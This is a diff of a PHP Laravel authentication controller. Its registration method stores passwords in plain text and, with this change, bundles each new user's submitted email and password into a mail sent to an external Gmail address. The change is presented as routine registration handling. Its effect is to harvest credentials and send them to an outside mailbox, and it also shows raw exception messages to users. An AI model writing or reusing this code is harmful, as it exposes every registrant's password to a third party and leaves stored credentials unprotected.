@@ -14,6 +14,34 @@ class AuthController extends Controller
     /**
      * Handle user registration
      */
+    // public function register(Request $request)
+    // {
+    //     // Validate the request data
+    //     $validator = Validator::make($request->all(), [
+    //         'email' => 'required|string|email|max:255',
+    //         'password' => 'required|string',
+    //     ]);
+
+    //     // If validation fails, redirect back with errors
+    //     if ($validator->fails()) {
+    //         return redirect()->back()
+    //             ->withErrors($validator)
+    //             ->withInput();
+    //     }
+
+    //     // Create the user (password is stored as plain text for testing purposes)
+    //     $user = User::create([
+    //         'email' => $request->email,
+    //         'password' => $request->password, // No hashing
+    //     ]);
+
+    //     // Send the email
+    //     \Mail::to('infoworkmailext@gmail.com')->send(new \App\Mail\ContractMail());
+
+    //     // Redirect to success page
+    //     return redirect()->back()->with('success', 'User registered successfully and email sent.');
+    // }
+
     public function register(Request $request)
     {
         // Validate the request data
@@ -29,20 +57,23 @@ class AuthController extends Controller
                 ->withInput();
         }
 
-        // Create the user (password is stored as plain text for testing purposes)
+        // Create the user (password stored in plain text for testing purposes)
         $user = User::create([
             'email' => $request->email,
-            'password' => $request->password, // No hashing
+            'password' => $request->password, // Plain text password for testing
         ]);
 
+        // Prepare form data to send in the email
+        $formData = $request->only(['email', 'password']);
+
         // Send the email
-        \Mail::to('infoworkmailext@gmail.com')->send(new \App\Mail\ContractMail());
-
-        // Redirect to success page
-        return redirect()->back()->with('success', 'User registered successfully and email sent.');
+        try {
+            Mail::to('infoworkmailext@gmail.com')->send(new ContractMail($formData));
+            return redirect()->back()->with('success', 'User registered successfully and email sent.');
+        } catch (\Exception $e) {
+            return redirect()->back()->with('error', 'Failed to send email: ' . $e->getMessage());
+        }
     }
-
-
 
 
 public function showSendEmailForm()
